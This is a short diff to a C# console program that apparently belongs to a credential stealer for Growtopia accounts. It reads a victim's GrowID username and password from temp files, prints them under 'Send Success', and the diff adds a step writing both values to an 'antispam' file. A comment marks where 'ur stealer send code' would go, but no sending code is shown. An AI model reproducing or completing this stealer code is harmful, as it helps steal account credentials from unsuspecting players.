@@ -22,8 +22,12 @@ namespace ConsoleApp4
             string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
             string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
             #endregion
+
             Console.Write("------------------------\n| Send Success         |\n");
             Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
+            //antispam
+            File.WriteAllText(Path.GetTempPath() + "\\antispam.txt", username + password);
+
             //ur stealer send code :v
         }
         static void Main(string[] args)
